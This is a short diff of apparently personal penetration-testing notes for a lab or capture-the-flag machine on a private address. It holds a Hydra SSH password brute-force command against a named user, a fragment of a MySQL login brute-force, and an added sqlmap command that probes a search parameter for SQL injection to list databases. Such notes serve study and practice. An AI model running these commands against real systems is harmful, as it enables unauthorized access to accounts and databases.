@@ -10,3 +10,7 @@ names.txt -x ignore:fgrep='Cannot log in to the MySQL server'
 
 # Hydra brute ssh
 hydra -l ramses -P /home/kali/10k-most-common.txt 192.168.1.142 -s 777 -t 4 ssh
+
+# use sqlmap to describe database
+sqlmap -u  http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=DESCRIBE phpmyadmin; --dbs
+
